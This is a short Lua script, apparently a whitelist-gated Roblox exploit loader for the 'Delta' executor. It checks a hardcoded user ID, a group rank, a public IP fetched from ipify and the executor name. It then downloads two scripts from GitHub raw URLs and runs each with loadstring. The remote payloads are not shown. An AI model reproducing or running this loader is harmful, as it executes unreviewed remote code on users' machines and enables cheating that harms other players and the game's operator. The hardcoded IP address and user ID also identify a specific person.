local p=game:GetService("Players").LocalPlayer
if not table.find({2391996272},p.UserId)then print("ask ur owner vex for perms Lmao!") return end
if not p:IsInGroup(35642989)or p:GetRankInGroup(35642989)~=3 then print("ask ur owner vex for perms LMao!") return end
local u="https://raw.githubusercontent.com/LundyFrankster/-/refs/heads/main/-"
local i="https://api.ipify.org"
local r=game:HttpGet(u,true)
if not(r and r:find("true"))then print("ask ur owner vex for perms LMAo!") return end
loadstring(r)()
local ok,ip=pcall(game.HttpGet,game,i)
if ok and ip~="186.57.238.57"then print("ask ur owner vex for perms LMAO!") return end
if identifyexecutor and identifyexecutor()~="Delta"then print("ask ur owner vex for perms LMAO!") return end

loadstring(game:HttpGet("https://raw.githubusercontent.com/saktkic51/-/refs/heads/main/-"))()
